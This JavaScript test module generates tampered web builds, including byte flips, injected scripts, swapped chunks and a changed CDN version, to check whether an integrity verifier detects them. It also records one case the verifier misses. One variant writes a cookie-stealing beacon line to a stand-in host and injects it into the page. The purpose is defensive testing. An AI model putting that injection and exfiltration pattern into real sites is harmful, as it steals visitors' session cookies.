// Generates the tampered builds for the campaign. Deliberately imports nothing from the verifier, so a
// shared assumption between the two can't make a tamper invisible to both.
import { cpSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs"
import { join } from "node:path"

function files(dir, extension) {
  const out = []
  for (const name of readdirSync(dir)) {
    const full = join(dir, name)
    if (statSync(full).isDirectory()) out.push(...files(full, extension))
    else if (name.endsWith(extension)) out.push(full)
  }
  return out.sort()
}

function copy(source, target) {
  rmSync(target, { recursive: true, force: true })
  cpSync(source, target, { recursive: true })
  return target
}

function entryScript(dir) {
  const html = readFileSync(join(dir, "index.html"), "utf8")
  const src = /<script[^>]*type="module"[^>]*src="([^"]+)"/.exec(html)?.[1]
  if (!src || src.startsWith("http")) throw new Error(`no same-origin module entry in ${dir}`)
  return join(dir, src)
}

/**
 * Every variant is a function from the clean build to a changed copy, plus what we expect.
 * @type {Record<string, { expect: string, miss?: string, only?: "vite" | "plain", make(source: string, target: string): void }>}
 */
export const VARIANTS = {
  "byte-flip": {
    expect: "MISMATCH",
    make(source, target) {
      copy(source, target)
      const path = entryScript(target)
      const bytes = readFileSync(path)
      const at = Math.floor(bytes.length / 2)
      bytes[at] = bytes[at] === 0x20 ? 0x09 : 0x20
      writeFileSync(path, bytes)
    },
  },
  "injected-script-tag": {
    expect: "MISMATCH",
    make(source, target) {
      copy(source, target)
      writeFileSync(join(target, "collect.js"), "navigator.sendBeacon('https://example.invalid', document.cookie)\n")
      const html = join(target, "index.html")
      writeFileSync(html, readFileSync(html, "utf8").replace("</head>", '  <script src="/collect.js"></script>\n  </head>'))
    },
  },
  "injected-inline-script": {
    expect: "MISMATCH",
    make(source, target) {
      copy(source, target)
      const html = join(target, "index.html")
      writeFileSync(html, readFileSync(html, "utf8").replace("</head>", "  <script>window.__swap = true</script>\n  </head>"))
    },
  },
  "lazy-chunk-swapped": {
    expect: "MISMATCH",
    make(source, target) {
      copy(source, target)
      const entry = entryScript(target)
      const lazy = files(target, ".js").find((path) => path !== entry)
      if (!lazy) throw new Error(`no lazy chunk in ${target}`)
      const swapped = readFileSync(lazy, "utf8").replace(/4b2e8d1f6a0c3957be21d4f8a6c09e3b57d19c1d/g, "bad0000000000000000000000000000000000bad")
      writeFileSync(lazy, `${swapped}\n;globalThis.__swapped = 1;\n`)
    },
  },
  "stylesheet-swapped": {
    expect: "MISMATCH",
    make(source, target) {
      copy(source, target)
      const css = files(target, ".css")[0]
      if (!css) throw new Error(`no stylesheet in ${target}`)
      writeFileSync(css, `${readFileSync(css, "utf8")}\n#sign { opacity: 0.999 }\n`)
    },
  },
  "cdn-version-swapped": {
    expect: "MISMATCH",
    only: "plain",
    make(source, target) {
      copy(source, target)
      const html = join(target, "index.html")
      writeFileSync(html, readFileSync(html, "utf8").replace("dayjs@1.11.13", "dayjs@1.11.12"))
    },
  },
  "remote-code-eval": {
    expect: "VERIFIED",
    miss: "the signed app runs text it fetches at runtime; that text is never a script resource",
    only: "plain",
    make(source, target) {
      copy(source, target)
      writeFileSync(join(target, "remote.txt"), "window.__swap = true\n")
    },
  },
}
